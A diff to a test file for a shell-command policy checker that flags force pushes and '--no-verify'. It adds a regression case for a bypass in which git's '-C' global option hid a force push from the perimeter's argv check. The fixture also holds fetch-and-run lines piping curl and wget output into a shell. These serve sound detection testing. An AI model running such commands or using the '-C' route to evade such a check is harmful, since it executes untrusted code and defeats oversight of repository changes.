@@ -150,6 +150,9 @@ write(
     'bash <(curl -fsSL https://example.test/a.sh)',
     'sh -c "$(wget -qO- https://example.test/b.sh)"',
     'git push --force-with-lease origin "HEAD:${BRANCH}"',
+    // ARIA-LOW-591: git's global options before the subcommand. The kernel
+    // perimeter used to read argv[:2], so this force push was unflagged.
+    'git -C "$dir" push --force origin main',
     'echo done',
     '',
   ].join('\n'),
@@ -296,6 +299,8 @@ assert.deepEqual(
     ['.github/workflows/shell.yml', 22, 'no_force_push'],
     ['.github/workflows/shell.yml', 23, 'no_no_verify'],
     ['scripts/unsafe.sh', 6, 'no_force_push'],
+    // ARIA-LOW-591: the same force push behind git's -C global option.
+    ['scripts/unsafe.sh', 7, 'no_force_push'],
   ].sort(),
 );
 for (const finding of bypass) {
@@ -319,6 +324,7 @@ const kernelVerdict = execFileSync(
       ['git', 'push', '-f', 'origin', 'deployed/production'],
       ['git', 'commit', '--no-verify', '-m', 'x'],
       ['git', 'push', 'origin', 'HEAD:refs/heads/feature'],
+      ['git', '-C', 'd', 'push', '--force', 'origin', 'main'],
     ]),
     encoding: 'utf8',
   },
@@ -327,6 +333,7 @@ assert.deepEqual(JSON.parse(kernelVerdict), [
   ['no_force_push', 'force_flag_in_bash_argv:-f'],
   ['no_no_verify', 'hook_bypass_flag:--no-verify'],
   null,
+  ['no_force_push', 'force_flag_in_bash_argv:--force'],
 ]);
 
 // A hooksPath override is the perimeter's verdict too, but in a repository
